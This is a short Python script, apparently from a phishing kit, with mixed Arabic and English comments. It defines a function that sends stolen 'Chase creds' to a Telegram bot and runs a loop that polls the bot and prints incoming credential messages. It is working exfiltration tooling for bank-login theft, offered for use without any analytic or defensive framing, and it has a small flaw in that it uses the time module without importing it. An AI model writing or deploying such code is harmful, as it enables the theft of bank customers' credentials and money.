# v9pei Telegram Bot - من الـ actual notes
import requests

TOKEN = 'YOUR_BOT_TOKEN'  # من notes
CHAT_ID = 'YOUR_CHAT_ID'  # من notes

def send_creds(creds):
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', 
                  data={'chat_id': CHAT_ID, 'text': f'New Chase creds: {creds}'})

# Monitor loop
while True:
    r = requests.get(f'https://api.telegram.org/bot{TOKEN}/getUpdates').json()
    for msg in r['result']:
        if 'creds' in msg['message']['text']:
            print(f"💰 {msg['message']['text']}")
    time.sleep(30)
